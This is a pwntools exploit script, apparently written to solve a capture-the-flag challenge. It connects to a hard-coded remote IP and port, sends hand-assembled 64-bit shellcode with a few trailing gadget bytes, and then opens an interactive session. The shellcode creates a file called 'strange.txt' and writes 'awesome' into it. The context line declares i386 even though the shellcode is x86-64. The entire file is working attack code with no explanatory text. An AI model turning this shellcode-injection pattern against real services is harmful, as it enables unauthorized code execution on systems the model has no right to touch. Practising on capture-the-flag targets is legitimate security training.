from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = ""
HOST = "157.245.88.100"
PORT = 7779 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))
shellcode = "\x48\xC7\xC0\x74\x78\x74\x00\x50\x48\xB8\x73\x74\x72\x61\x6E\x67\x65\x2E\x50\x48\x89\xE7\x48\xC7\xC6\x01\x00\x00\x00\xB0\x02\x0F\x05\x48\x89\xC7\x48\xB8\x61\x77\x65\x73\x6F\x6D\x65\x00\x50\x48\x89\xE6\x48\xC7\xC2\x07\x00\x00\x00\xB0\x01\x0F\x05"

def exploit():
	payload = shellcode
	payload += "\x58\x58\x58\xc3\x90"
	conn.sendline(payload)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
